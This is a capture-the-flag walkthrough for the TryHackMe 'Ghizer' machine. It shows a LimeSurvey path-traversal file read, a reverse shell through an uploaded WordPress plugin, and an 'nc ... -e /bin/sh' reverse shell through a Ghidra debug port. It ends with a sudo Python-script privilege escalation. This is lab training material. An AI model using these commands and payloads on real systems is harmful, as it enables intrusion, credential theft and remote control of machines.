---
layout: default
title : muzec - Ghizer CTF Writeup
---

![Image](https://miro.medium.com/max/282/1*m_eUZThPxtdEFiE8wy0CHw.png)

```lucrecia has installed multiple web applications on the server.```

It been long lately since i posted some hacking write-up on the new boxes release on TryHackMe so let hack some new machines.

# Nmap

```
Nmap 7.80 scan initiated Sat Sep 5 12:36:49 2020 as: nmap -sC -sV -oA nmap 10.10.33.119
Nmap scan report for 10.10.33.119
Host is up (0.16s latency).
Not shown: 994 closed ports
PORT STATE SERVICE VERSION
21/tcp open ftp?
| fingerprint-strings:
| DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest, X11Probe:
| 220 Welcome to Anonymous FTP server (vsFTPd 3.0.3)
| Please login with USER and PASS.
| FourOhFourRequest, Kerberos, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|_ 220 Welcome to Anonymous FTP server (vsFTPd 3.0.3)
80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
443/tcp open ssl/http Apache httpd 2.4.18 ((Ubuntu))
544/tcp filtered kshell
1864/tcp filtered paradym-31
32768/tcp filtered filenet-tms
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.80%I=7%D=9/5%Time=5F53BEC2%P=x86_64-pc-linux-gnu%r(NULL,
SF:33,”220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203
SF:\.0\.3\)\n”)%r(GenericLines,58,”220\x20Welcome\x20to\x20Anonymous\x20FT
SF:P\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please\x20login\x20with\x2
SF:0USER\x20and\x20PASS\.\n”)%r(Help,58,”220\x20Welcome\x20to\x20Anonymous
SF:\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please\x20login\x20w
SF:ith\x20USER\x20and\x20PASS\.\n”)%r(GetRequest,58,”220\x20Welcome\x20to\
SF:x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please\x
SF:20login\x20with\x20USER\x20and\x20PASS\.\n”)%r(HTTPOptions,58,”220\x20W
SF:elcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n53
SF:0\x20Please\x20login\x20with\x20USER\x20and\x20PASS\.\n”)%r(RTSPRequest
SF:,58,”220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x20
SF:3\.0\.3\)\n530\x20Please\x20login\x20with\x20USER\x20and\x20PASS\.\n”)%
SF:r(RPCCheck,33,”220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(
SF:vsFTPd\x203\.0\.3\)\n”)%r(DNSVersionBindReqTCP,58,”220\x20Welcome\x20to
SF:\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please\
SF:x20login\x20with\x20USER\x20and\x20PASS\.\n”)%r(DNSStatusRequestTCP,58,
SF:”220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0
SF:\.3\)\n530\x20Please\x20login\x20with\x20USER\x20and\x20PASS\.\n”)%r(SS
SF:LSessionReq,33,”220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\
SF:(vsFTPd\x203\.0\.3\)\n”)%r(TerminalServerCookie,33,”220\x20Welcome\x20t
SF:o\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n”)%r(TLSSessi
SF:onReq,33,”220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTP
SF:d\x203\.0\.3\)\n”)%r(Kerberos,33,”220\x20Welcome\x20to\x20Anonymous\x20
SF:FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n”)%r(SMBProgNeg,33,”220\x20Welc
SF:ome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n”)%r(
SF:X11Probe,58,”220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vs
SF:FTPd\x203\.0\.3\)\n530\x20Please\x20login\x20with\x20USER\x20and\x20PAS
SF:S\.\n”)%r(FourOhFourRequest,33,”220\x20Welcome\x20to\x20Anonymous\x20FT
SF:P\x20server\x20\(vsFTPd\x203\.0\.3\)\n”);

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done at Sat Sep 5 12:40:40 2020–1 IP address (1 host up) scanned in 230.68 seconds
```

We have 3 open ports 21,80 and 443 observing my Nmap output indicated we have anonymous access to the FTP server let log in.

![image](https://miro.medium.com/max/700/1*J6-99hyjIVwEbl6684Ar6w.png)

We don’t have access to any of the file in the FTP server time to dig into port 80 to see what is cooking hahahahaha.

![Image](https://miro.medium.com/max/700/1*I1SnJvkkk3tWecWjTNo0Qg.png)

LimeSurvey hmmm let try to burst some directory's.

![Image](https://miro.medium.com/max/700/1*2iU7EE-fez2Ymfde9cCArA.png)

Some the only juicy directory i get is /admin you can easily access the admin page with ```http://Machine_IP/admin``` and boom we are in so i try admin and admin for both username and password but no luck time to do some research.

![Image](https://miro.medium.com/max/700/1*tsdO2upa20Qd9-vFRw9PAg.png)

Now let give it a try.

![Image](https://miro.medium.com/max/700/1*hmalAdm5tFPPtHjudmpUuQ.png)

Boom and we are in hey you reading well done you are in now let move to the next step.

![Image](https://miro.medium.com/max/700/1*1L1E6H-67IFllaL8udznHA.png)

LimeSurvey Version 3.15.9 interesting let try to find some exploit.

![Image](https://miro.medium.com/max/700/1*dZxyHKwOIdlJZX53Rqve2Q.png)

LimeSurvey Zip Path Traversals let give it a shot some details about the module exploit we are trying to use now.

This module exploits an authenticated path traversal vulnerability found in LimeSurvey versions between 4.0 and 4.1.11 with CVE-2020–11455 or <= 3.15.9 with CVE-2019–9960, inclusive. In CVE-2020–11455 the getZipFile function within the filemanager functionality allows for arbitrary file download.

The file retrieved may be deleted after viewing, which was confirmed in testing. In CVE-2019–9960 the szip function within the downloadZip functionality allows for arbitrary file download. Verified against 4.1.11–200316, 3.15.0–181008, 3.9.0–180604, 3.6.0–180328, 3.0.0–171222, and 2.70.0–170921.

# Metasploit

![Image](https://miro.medium.com/max/700/1*xkWRD__o4E8-_LPH5KCxeQ.png)

So i was able to read the passwd file /etc/passwd

![Image](https://miro.medium.com/max/700/1*drg-r5ornIT5LPKDGW7saw.png)

But when i try to read the /application/config/config.php no luck time for some research again.

![Image](https://miro.medium.com/max/700/1*wrcUF1E_OO329RhI5HigWg.png)

Limesurvey is an open-source application written in PHP, created specifically to conduct online surveys. It is really useful for those users who lack programming knowledge, helping them to generate an environment for the collection of answers about their surveys.

A few weeks ago I found and reported an Arbitrary File Download vulnerability, which is registered as CVE-2019–9960. This vulnerability allows an Administrator to download internal files from the server, through a Directory Traversal. The vulnerability affects the versions <= 3.15.9+190214.

Until the date of the date, LimeSurvey has a total of 1.124 stars on GitHub.

# Burp Suite

When a user exports the structure of a survey to *.lss format, a modal is generated with the “Download archive” button.

Click on survey in the admin panel of the LimeSurvey now tick on the present survey to export.

![Image](https://miro.medium.com/max/700/1*35VbqcDGfs5IQlLxT4Svsw.png)

Now click on Survey structure (*lss) you should a download archive button.

![Image](https://miro.medium.com/max/700/1*UNmVvYJh32aKMtuRH9DkCA.png)

Don’t download yet time to intercept request with burp suite intercept is on now click on Download archive.

![Image](https://miro.medium.com/max/700/1*auYZ_y31ZLhmy4_o63nx6g.png)

Boom we have the request now let send it to repeater.

![Image](https://miro.medium.com/max/700/1*BwOz175-GjRzjvmRlZrAmQ.png)

Now let read the config file ```/index.php/admin/export/sa/downloadZip/?sZip=../application/config/config.php``` make sure you edit the request and click on send.


![Image](https://miro.medium.com/max/700/1*lKCohAW51l876jyHOE7BYA.png)

Checking the response boom we have the config file task 1 done What are the credentials you found in the configuration file?

Ans: ****:*******

Time to jump to task 2 What is the login path for the wordpress installation?

Bursting port 80 directory give nothing time to check out port 443 maybe can find something juicy.

![Image](https://miro.medium.com/max/700/1*IUciFdVS6pe4bRGWNESq8w.png)

Scrolling down and clicking on log in give me the login path to log into wordpress admin panel.

![image](https://miro.medium.com/max/700/1*8pQJ835-tY6CGESpsCxvEg.png)

Yes i know i star the path hahahahah now let log in with the credentials we got from the config file and boom we are in.

Ans: **********

![Image](https://miro.medium.com/max/700/1*mT-smrYSBeP2ytwFG-wpgw.png)

Now let spawn a reverse shell back to our terminal that more fun to work with.

![Image](https://miro.medium.com/max/700/1*b3s7CzVmqI5mMXpuQt9pfw.png)

I actually use the plugins way to get a reverse shell a simple bash reverse shell in Php and zip it to be able to upload it on the plugins page.

![Image](https://miro.medium.com/max/700/1*5P5H-qBo6KnhZLaaLch8YQ.png)

Click on install now and go to your terminal to start a ncat listener go back to the blog and click on activate boom you should have a reverse shell.

![Image](https://miro.medium.com/max/700/1*DIm8MnzBlr6ETi7bMNGFnA.png)

Let change directory to home to get the user.txt flag.

![Image](https://miro.medium.com/max/700/1*Nw8muez7u0AqeS1nsK0TlA.png)

Permission denied and we are www-data we need to find way to migrate to another user maybe Veronica when enumerating to get a password for Veronica or a way to get another reverse shell i find some interesting exploit for ghidra_9.0 (Debug Mode).

![Image](https://miro.medium.com/max/700/1*WciUIAqFGYb2XcAP7ocJOA.png)

Since we know port 18001 is running on localhost let type the command ```jdb -attach 127.0.0.1:18001``` now type ```classpath``` after that type ```classes```

![Image](https://miro.medium.com/max/700/1*Zlf5HBSYmMB1zrfesH9cGA.png)

Now type in ```stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()```

![Image](https://miro.medium.com/max/700/1*lLJR0zPa1MTB28hUkP3nDw.png)

Wait and you should get a way to spawn a reverse shell.

![Image](https://miro.medium.com/max/700/1*tm0NlRkQTfpFCArwKRL0Eg.png)

Now type in ```print new java.lang.Runtime().exec(“nc 10.8.0.0.0 1337-e /bin/sh”)``` make sure you a ncat listener and change the IP and port.

![Image](https://miro.medium.com/max/700/1*LSUxBrAeto6B7jPzll9tFg.png)

Boom let get the User.txt flag now.

![Image](https://miro.medium.com/max/700/1*rNWt2dHIFyVgEynisfMdFA.png)

Now we have User.txt let get root flag.

![Image](https://miro.medium.com/max/700/1*AkgcygQCfEOxYhpFtcth1w.png)

Cool we can run sudo on ```/usr/bin/python3.5 /home/veronica/base.py``` hahahaha let cat the base.py.

![Image](https://miro.medium.com/max/700/1*j3KH5m4H2YUlmRtpwmmuhA.png)

WTF! permission denied ok let try another trick let try to remove ```/home/veronica/base.py``` with ```rm -rf /home/veronica/base.py```.

![Image](https://miro.medium.com/max/700/1*89c26pGcxr9BcCRXXyEMZg.png)

Boom it work let try to create it back with some python shell in it.

![Image](https://miro.medium.com/max/700/1*TpxqPAY90MSJcWvcqr0Drg.png)

```echo ‘import pty; pty.spawn(“/bin/sh”)’ > /home/veronica/base.py``` boom done now let run it with ```sudo /usr/bin/python3.5 /home/veronica/base.py``` .

![Image](https://miro.medium.com/max/700/1*pFaEqtrHJi5ti64mCjOuYg.png)

Booooom and we are root hahahahaha box rooted.

![Image](https://miro.medium.com/max/700/1*LTXsoS8OWLpZzv1tAFwmtw.png)

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>


